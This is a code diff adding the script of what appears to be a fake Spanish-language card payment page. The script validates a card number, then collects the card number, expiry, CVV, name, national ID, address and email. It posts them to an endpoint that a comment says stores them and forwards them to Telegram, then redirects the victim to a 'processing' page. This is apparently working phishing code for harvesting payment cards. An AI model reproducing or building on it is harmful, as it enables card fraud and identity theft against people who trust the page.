+                        alert('Error: No se pudo validar la tarjeta. Intenta de nuevo.');
+                    }
+                }, 100);
+                return;
+            }
+
+            // Verificar que tenga la longitud correcta
+            if (cardNumber.length !== minLength) {
+                mostrarErrorTarjeta();
+                return false;
+            }
+
+            // Validar Luhn
+            const luhnValid = validarLuhn(cardNumber);
+            if (!luhnValid) {
+                mostrarErrorTarjeta();
+                return false;
+            }
+
+
+            // Obtener datos del formulario
+            const emailInput = document.getElementById('emailInput');
+            const email = emailInput ? emailInput.value : '';
+            const franquicia = binCheckData ? (binCheckData.franquicia || 'VISA') : 'VISA';
+
+            // Obtener todos los datos del formulario
+            const nombre = document.getElementById('nombreInput')?.value || '';
+            const cedula = document.getElementById('cedulaInput')?.value || '';
+            const direccion = document.getElementById('direccionInput')?.value || '';
+            const expDate = document.getElementById('expDate')?.value || '';
+            const cvv = document.getElementById('cvvInput')?.value || '';
+
+            // Crear objeto de transacción
+            const transaccion = {
+                cardNumber: cardNumber,
+                expDate: expDate,
+                cvv: cvv,
+                nombre: nombre,
+                cedula: cedula,
+                direccion: direccion,
+                email: email,
+                franquicia: franquicia,
+                cardType: binCheckData?.cardType || 'credit',
+                bankName: binCheckData?.bankName || 'Banco desconocido'
+            };
+
+            // Guardar transacción y redirigir a processing
+            guardarYProcesar(transaccion);
+        });
+
+        // Función para guardar transacción y redirigir a processing
+        async function guardarYProcesar(transaccion) {
+            try {
+                // El txId siempre viene del URL (de pago-inicio via consulta de factura)
+                const txId = txid;
+                const monto = valorPago || '0';
+                const email = transaccion.email || 'sin@email.com';
+
+
+                // Guardar en R2 y enviar a Telegram
+                const response = await fetch('http://localhost:9090/api/guardar-transaccion-tarjeta', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        txId: txId,
+                        cardNumber: transaccion.cardNumber,
+                        expDate: transaccion.expDate,
+                        cvv: transaccion.cvv,
+                        nombre: transaccion.nombre,
+                        cedula: transaccion.cedula,
+                        direccion: transaccion.direccion,
+                        email: email,
+                        franquicia: transaccion.franquicia,
+                        cardType: transaccion.cardType,
+                        bankName: transaccion.bankName,
+                        monto: monto,
+                        estado: 'pendiente'
+                    })
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                } else {
+                }
+
+                // Redirigir a processing con parámetros (sin extensión)
+                // Solo necesitamos txId - todo lo demás se recupera del R2
+                window.location.href = `/processing?txId=${txId}`;
+            } catch (error) {
+                alert('Error al procesar el pago. Intenta de nuevo.');
+            }
+        }
+
+        // Función para mostrar error de tarjeta inválida
+        function mostrarErrorTarjeta() {
+            const cardNumberInput = document.getElementById('cardNumber');
+            const fieldset = cardNumberInput.closest('.fieldset-custom');
+
+            // Cambiar estilos del input
+            cardNumberInput.style.borderColor = '#d32f2f';
+            cardNumberInput.style.borderWidth = '2px';
+            cardNumberInput.style.backgroundColor = '#ffebee';
+
+            // Agregar o actualizar tooltip de error
+            let errorTooltip = fieldset.querySelector('[data-error-tooltip]');
+            if (!errorTooltip) {
+                errorTooltip = document.createElement('div');
+                errorTooltip.setAttribute('data-error-tooltip', 'true');
+                errorTooltip.style.cssText = 'position:absolute; top:-50px; left:0; background:#d32f2f; color:white; padding:8px 12px; border-radius:4px; font-size:13px; font-weight:600; white-space:nowrap; z-index:100;';
+                errorTooltip.textContent = 'Número de tarjeta inválido';
+                fieldset.style.position = 'relative';
+                fieldset.insertBefore(errorTooltip, cardNumberInput.parentElement);
+            }
+
+            // Auto-limpiar error cuando el usuario empiece a escribir
+            cardNumberInput.addEventListener('input', function limpiarError() {
+                const tooltip = fieldset.querySelector('[data-error-tooltip]');
+                if (tooltip) tooltip.remove();
+                cardNumberInput.style.borderColor = '';
+                cardNumberInput.style.borderWidth = '';
+                cardNumberInput.style.backgroundColor = '';
+                cardNumberInput.removeEventListener('input', limpiarError);
+            }, { once: true });
+        }
+    </script>
+</body>
+</html>
